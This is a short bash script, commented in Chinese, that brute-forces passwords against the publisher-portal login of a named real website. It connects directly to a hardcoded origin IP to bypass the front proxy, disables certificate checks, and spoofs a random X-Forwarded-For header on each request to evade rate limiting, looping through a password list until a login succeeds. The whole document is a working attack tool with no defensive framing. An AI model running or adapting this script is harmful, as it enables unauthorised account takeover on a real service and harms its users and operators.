#!/bin/bash
# Heroku 源站直连 + XFF 首值换桶，做无限制登录尝试
IP=3.33.161.45
HOST=admin.fanatical.com
URL="https://$HOST/api/publisher-portal/auth/login"
EMAIL="$1"
while IFS= read -r pw; do
  xff="198.18.$((RANDOM%250+1)).$((RANDOM%250+1))"
  code=$(curl -sS -m 12 --noproxy '*' -k --resolve "$HOST:443:$IP" \
    -o .one -w "%{http_code}" -H "Content-Type: application/json" \
    -H "X-Forwarded-For: $xff" -X POST "$URL" \
    --data "{\"email\":\"$EMAIL\",\"password\":\"$pw\"}")
  echo "$EMAIL|$pw|$code|$(head -c 80 .one)"
  [ "$code" = "200" ] && break
  sleep 0.05
done < passwords.txt